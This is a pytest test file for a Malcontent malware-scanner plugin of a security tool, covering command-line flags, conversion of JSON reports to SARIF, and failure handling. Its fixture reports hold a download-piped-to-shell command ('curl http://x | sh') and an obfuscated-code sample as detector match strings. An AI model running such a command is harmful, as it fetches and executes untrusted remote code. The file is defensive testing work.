# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""MalcontentScanner: the invocation, the JSON-to-SARIF conversion and failure modes.

The report shape is the one in Malcontent's ``pkg/malcontent`` Go structs
(``Report.Files`` -> ``FileReport.Behaviors`` -> ``Behavior``), written out by hand
below. The scan() tests replace the subprocess with a fake, so they run on every
platform without the binary.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest

from automated_security_helper.base.plugin_context import PluginContext
from automated_security_helper.config.default_config import get_default_config
from automated_security_helper.core.enums import OfflineStrategy
from automated_security_helper.core.exceptions import ScannerError
from automated_security_helper.plugin_modules import ash_malcontent_plugins
from automated_security_helper.plugin_modules.ash_malcontent_plugins import (
    malcontent_scanner as ms,
)
from automated_security_helper.plugin_modules.ash_malcontent_plugins.malcontent_scanner import (
    MalcontentScanner,
    MalcontentScannerConfig,
    MalcontentScannerConfigOptions,
)
from automated_security_helper.schemas.sarif_schema_model import SarifReport

pytestmark = pytest.mark.unit

#: A report written by hand to the Go struct shapes: one critical behavior in
#: ``app/dropper.sh``, one low one beside it, one medium one in ``lib/net.py``, one
#: file Malcontent skipped, and one behavior with a level this plugin does not know.
POSITIVE = {
    "Files": {
        "app/dropper.sh": {
            "Path": "app/dropper.sh",
            "SHA256": "0" * 64,
            "Size": 120,
            "RiskScore": 4,
            "RiskLevel": "CRITICAL",
            "Behaviors": [
                {
                    "ID": "exec/shell/pipe_to_sh",
                    "Description": "pipes a download into a shell",
                    "MatchStrings": ["curl http://x | sh"],
                    "RiskScore": 4,
                    "RiskLevel": "CRITICAL",
                    "RuleURL": "https://github.com/chainguard-dev/malcontent/blob/main/rules/x.yara",
                },
                {
                    "ID": "fs/path/etc",
                    "Description": "references /etc",
                    "RiskScore": 1,
                    "RiskLevel": "LOW",
                },
            ],
        },
        "./lib/net.py": {
            "Path": "./lib/net.py",
            "Behaviors": [
                {
                    "ID": "net/socket/connect",
                    "Description": "opens a socket",
                    "RiskScore": 2,
                    "RiskLevel": "MEDIUM",
                },
                {
                    "ID": "weird/level",
                    "Description": "a level from a newer malcontent",
                    "RiskScore": 9,
                    "RiskLevel": "EXTREME",
                },
            ],
        },
        "skipped.bin": {"Path": "skipped.bin", "Skipped": "too large"},
    }
}

NEGATIVE: Dict[str, Any] = {"Files": {}}

#: (ruleId, level, issue_severity, uri), sorted by file path then behavior order.
POSITIVE_EXPECTED = [
    ("net/socket/connect", "warning", "MEDIUM", "lib/net.py"),
    ("weird/level", "error", "HIGH", "lib/net.py"),
    ("exec/shell/pipe_to_sh", "error", "CRITICAL", "app/dropper.sh"),
    ("fs/path/etc", "none", "INFO", "app/dropper.sh"),
]


def _findings(report: SarifReport) -> List[tuple]:
    out = []
    for r in report.get_all_results():
        loc = r.locations[0].physicalLocation.root
        out.append(
            (
                r.ruleId,
                getattr(r.level, "value", r.level),
                getattr(r.properties, "issue_severity", None),
                loc.artifactLocation.uri,
            )
        )
    return out


class FakeMalcontent:
    """Stands in for _run_subprocess: records argv, writes the given report."""

    def __init__(
        self,
        document: Optional[Any] = POSITIVE,
        exit_code: int = 0,
        text: Optional[str] = None,
        stderr: str = "",
        stdout: str = "",
    ):
        self.document, self.exit_code = document, exit_code
        self.text, self.stderr, self.stdout = text, stderr, stdout
        self.calls: List[Dict[str, Any]] = []

    def __call__(self, scanner):
        def run(command, results_dir=None, env=None, timeout=None, cwd=None, **_):
            self.calls.append(
                {"argv": list(command), "env": env, "timeout": timeout, "cwd": cwd}
            )
            output_arg = next(a for a in command if a.startswith("--output="))
            path = Path(output_arg.split("=", 1)[1])
            text = self.text
            if text is None and self.document is not None:
                text = json.dumps(self.document)
            if text is not None:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(text, encoding="utf-8")
            scanner.exit_code = self.exit_code
            return {
                "returncode": self.exit_code,
                "stdout": self.stdout,
                "stderr": self.stderr,
            }

        return run

    @property
    def argv(self) -> List[str]:
        return self.calls[0]["argv"]


def _scanner(source: Path, tmp_path: Path, **options) -> MalcontentScanner:
    config = get_default_config()
    output = tmp_path / "out"
    return MalcontentScanner(
        context=PluginContext(
            source_dir=source,
            output_dir=output,
            work_dir=output / "converted",
            config=config,
        ),
        config=MalcontentScannerConfig(
            enabled=True, options=MalcontentScannerConfigOptions(**options)
        ),
    )


@pytest.fixture
def tree(tmp_path) -> Path:
    src = tmp_path / "src"
    (src / "app").mkdir(parents=True)
    (src / "app" / "dropper.sh").write_text("echo hi\n")
    return src


@pytest.fixture
def on_path(monkeypatch):
    monkeypatch.setattr(ms, "find_executable", lambda cmd: f"/fake/bin/{cmd}")


def _run(scanner, fake, monkeypatch, target=None, target_type="source"):
    monkeypatch.setattr(scanner, "_run_subprocess", fake(scanner))
    return scanner.scan(
        target=Path(target or scanner.context.source_dir), target_type=target_type
    )


class TestCommunityPlugin:
    def test_scanner_is_on_by_default_once_its_module_is_listed(self):
        assert MalcontentScannerConfig().enabled is True
        assert MalcontentScannerConfig().name == "malcontent"

    def test_the_builtin_config_does_not_declare_it(self):
        assert not hasattr(get_default_config().scanners, "malcontent")

    def test_the_module_exports_the_scanner(self):
        assert ash_malcontent_plugins.ASH_SCANNERS == [MalcontentScanner]
        assert ash_malcontent_plugins.ASH_REPORTERS == []

    def test_declarations(self):
        assert MalcontentScanner.python_only is False
        assert MalcontentScanner.success_exit_codes == {0}
        assert MalcontentScanner.offline_strategy is OfflineStrategy.BUNDLED


class TestInvocation:
    def test_every_fixed_flag_and_the_scan_path(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        fake = FakeMalcontent()
        _run(scanner, fake, monkeypatch)
        argv = fake.argv
        assert argv[0] == "mal"
        # Global flags precede the subcommand; the path follows "--".
        sub = argv.index("analyze")
        assert argv[1:sub][0] == "--format=json"
        assert "--min-risk=low" in argv[1:sub]
        assert "--ignore-self" in argv[1:sub]
        # Third-party rules are ON by default and may carry licensing restrictions.
        assert "--third-party=false" in argv[1:sub]
        assert "--third-party" not in argv
        assert any(a.startswith("--output=") for a in argv[1:sub])
        assert argv[sub + 1 :] == ["--", "."]

    @pytest.mark.parametrize(
        "flag",
        [
            "--image",
            "-i",
            "--processes",
            "--oci-auth",
            "--exit-first-hit",
            "--exit-first-miss",
        ],
    )
    def test_flags_that_reach_out_or_change_exit_status_are_never_passed(
        self, flag, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        fake = FakeMalcontent()
        _run(scanner, fake, monkeypatch)
        assert flag not in fake.argv

    def test_a_converted_target_is_an_absolute_path(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        converted = tmp_path / "out" / "converted"
        converted.mkdir(parents=True)
        (converted / "a.py").write_text("x = 1\n")
        scanner = _scanner(tree, tmp_path)
        fake = FakeMalcontent(document=NEGATIVE)
        _run(scanner, fake, monkeypatch, target=converted, target_type="converted")
        assert fake.argv[-2:] == ["--", converted.absolute().as_posix()]

    def test_a_report_left_by_an_earlier_run_is_removed_before_the_next_one(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        _run(scanner, FakeMalcontent(), monkeypatch)
        stale = Path(scanner.results_dir) / "source" / "malcontent.json"
        assert stale.exists()
        # A second run that writes nothing must not read the first run's report.
        _, results_file, _ = scanner._execute_scan(tree, "source", [])
        assert results_file == stale
        assert not stale.exists()

    def test_the_timeout_reaches_the_subprocess(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path, scan_timeout=77)
        fake = FakeMalcontent()
        _run(scanner, fake, monkeypatch)
        assert 0 < fake.calls[0]["timeout"] <= 77


class TestReport:
    def test_positive_report_is_rated_and_located(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        report = _run(_scanner(tree, tmp_path), FakeMalcontent(), monkeypatch)
        assert isinstance(report, SarifReport)
        assert _findings(report) == POSITIVE_EXPECTED

    def test_negative_control_has_no_findings(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        report = _run(
            _scanner(tree, tmp_path), FakeMalcontent(document=NEGATIVE), monkeypatch
        )
        assert _findings(report) == []

    @pytest.mark.parametrize(
        "level,expected",
        [
            ("CRITICAL", ("CRITICAL", "error")),
            ("critical", ("CRITICAL", "error")),
            ("HIGH", ("HIGH", "error")),
            ("MEDIUM", ("MEDIUM", "warning")),
            ("LOW", ("INFO", "none")),
            ("HARMLESS", ("INFO", "none")),
            ("EXTREME", ("HIGH", "error")),
            (None, ("HIGH", "error")),
        ],
    )
    def test_severity_mapping_rows(self, level, expected):
        assert ms.severity_for(level) == expected

    def test_matched_strings_are_never_copied_into_the_report(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        report = _run(_scanner(tree, tmp_path), FakeMalcontent(), monkeypatch)
        assert "curl http://x" not in report.model_dump_json()

    def test_converter_places_paths_relative_to_the_target(self, tmp_path):
        document = {
            "Files": {
                f"{tmp_path.as_posix()}/a/b.py": {
                    "Behaviors": [{"ID": "r", "Description": "d", "RiskLevel": "HIGH"}]
                }
            }
        }
        sarif = ms.convert_malcontent_report(document, tmp_path)
        uri = sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"][
            "artifactLocation"
        ]["uri"]
        assert uri == "a/b.py"


class TestExitStatus:
    @pytest.mark.parametrize("code", [1, 2, 5, 22, 126, 137])
    def test_any_nonzero_exit_fails_even_with_a_report_on_disk(
        self, code, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        with pytest.raises(ScannerError):
            _run(scanner, FakeMalcontent(exit_code=code), monkeypatch)

    def test_stderr_is_not_copied_into_errors(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        secret_line = "quoted line from the scanned tree"
        _run(scanner, FakeMalcontent(stderr=secret_line), monkeypatch)
        assert all(secret_line not in str(e) for e in scanner.errors)

    def test_failure_message_names_the_log_and_does_not_quote_it(self, tmp_path):
        scanner = _scanner(tmp_path, tmp_path)
        scanner.exit_code = 22
        message = scanner._describe_scan_failure(
            RuntimeError("boom"), tmp_path / "source" / "malcontent.json"
        )
        assert "exit code 22" in message
        assert "stderr.log" in message


class TestMalformedOutput:
    @pytest.mark.parametrize(
        "text",
        ["not json", "[1, 2]", '"a string"', '{"Files": [1]}'],
    )
    def test_a_malformed_report_fails_the_scan(
        self, text, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        with pytest.raises(Exception):
            _run(scanner, FakeMalcontent(text=text), monkeypatch)

    def test_a_run_that_wrote_no_report_fails_the_scan(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        with pytest.raises(Exception):
            _run(scanner, FakeMalcontent(document=None), monkeypatch)

    def test_the_converter_refuses_a_non_object(self, tmp_path):
        with pytest.raises(ScannerError):
            ms.convert_malcontent_report([], tmp_path)


class TestTimeout:
    def test_a_timed_out_run_fails_the_scan(self, tree, tmp_path, on_path, monkeypatch):
        scanner = _scanner(tree, tmp_path)

        def timed_out(command, results_dir=None, **_):
            scanner.exit_code = 124
            return {"returncode": 124, "stdout": "", "stderr": "", "timed_out": True}

        monkeypatch.setattr(scanner, "_run_subprocess", timed_out)
        with pytest.raises(ScannerError):
            scanner.scan(target=tree, target_type="source")


class TestDependencyCheck:
    def test_missing_binary(self, tree, tmp_path, monkeypatch):
        monkeypatch.setattr(ms, "find_executable", lambda cmd: None)
        assert _scanner(tree, tmp_path).validate_plugin_dependencies() is False

    def test_present_binary(self, tree, tmp_path, on_path):
        assert _scanner(tree, tmp_path).validate_plugin_dependencies() is True

    def test_the_long_executable_name_is_found_too(self, tree, tmp_path, monkeypatch):
        monkeypatch.setattr(
            ms,
            "find_executable",
            lambda cmd: "/x/malcontent" if cmd == "malcontent" else None,
        )
        scanner = _scanner(tree, tmp_path)
        assert scanner.validate_plugin_dependencies() is True
        assert scanner._executable() == "malcontent"

    def test_no_pinned_install_exists_because_no_release_binary_is_published(
        self, tree, tmp_path
    ):
        assert not _scanner(tree, tmp_path).custom_install_commands


#: One file report with the members upstream's own ``--format=json`` outputs carry
#: (Malcontent v1.28.2 ``tests/**/*.json``: Pledge, Syscalls, SHA256, Size, and per
#: behavior ID, RuleName, RiskScore, RuleURL, ReferenceURL, RuleAuthor, RuleLicense,
#: MatchStringsOmitted), with the upstream key spellings and upper-case risk levels.
UPSTREAM_SHAPE = {
    "Files": {
        "npm/pkg/postinstall.js": {
            "Path": "npm/pkg/postinstall.js",
            "SHA256": "1" * 64,
            "Size": 115064,
            "Pledge": ["inet", "wpath"],
            "Syscalls": ["openat"],
            "RiskScore": 3,
            "RiskLevel": "HIGH",
            "Behaviors": [
                {
                    "Description": "name mangling used by obfuscation tools",
                    "MatchStrings": ["function _0x10e175(", "token=SECRET-IN-TREE"],
                    "MatchStringsOmitted": 12,
                    "RiskScore": 3,
                    "RiskLevel": "HIGH",
                    "RuleURL": "https://github.com/chainguard-dev/malcontent/blob/main/rules/anti-static/obfuscation/js.yara#L1",
                    "ReferenceURL": "https://example.test/ref",
                    "RuleAuthor": "someone",
                    "RuleLicense": "Apache-2.0",
                    "ID": "anti-static/obfuscation/js",
                    "RuleName": "js_mangle",
                }
            ],
        }
    }
}


class TestUpstreamShape:
    def test_a_report_with_the_members_upstream_writes_converts(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        report = _run(scanner, FakeMalcontent(document=UPSTREAM_SHAPE), monkeypatch)
        assert _findings(report) == [
            ("anti-static/obfuscation/js", "error", "HIGH", "npm/pkg/postinstall.js")
        ]

    def test_no_matched_text_reaches_the_report(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        scanner = _scanner(tree, tmp_path)
        report = _run(scanner, FakeMalcontent(document=UPSTREAM_SHAPE), monkeypatch)
        dumped = report.model_dump_json()
        assert "SECRET-IN-TREE" not in dumped
        assert "_0x10e175" not in dumped


class TestLinks:
    def test_the_command_names_no_link_and_follows_none(
        self, tree, tmp_path, on_path, monkeypatch
    ):
        """Malcontent's walk skips symlinks itself, so nothing is excluded or followed."""
        scanner = _scanner(tree, tmp_path)
        fake = FakeMalcontent()
        _run(scanner, fake, monkeypatch)
        assert not [a for a in fake.argv if "exclude" in a or "follow" in a]
        # The scan path is a directory, which is what makes the walk skip links.
        assert fake.argv[-2:] == ["--", "."]
